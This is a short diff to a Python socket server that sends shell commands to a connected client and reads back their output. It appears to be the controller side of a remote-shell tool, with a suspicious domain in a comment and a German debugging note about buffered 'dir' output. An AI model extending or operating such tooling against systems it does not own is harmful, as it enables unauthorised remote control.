@@ -10,6 +10,7 @@ class Socket:
     def __init__(self, ip_address, port):
         self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.socket.bind((ip_address, port))
+        self.socket.settimeout(4)
         self.listen_to_for_client()
 
     def listen_to_for_client(self):
@@ -30,7 +31,7 @@ class Socket:
             self.established = False
             print(f"Lost connection to {self.address}")
             return False
-        if "-batch" in command.decode() or "cd.." in command.decode():
+        if "-batch" in command.decode() or "cd.." in command.decode() or "cd" in command.decode():
             return
         self.receive_command_output()
 
@@ -68,6 +69,6 @@ while True:
 
 
 # uhblajkil.cf
-# Verbindung fixen
+# Server empfängt "dir" nur beim nächsten Ausführen eines commands steckt im buffer oder so fest
 
 
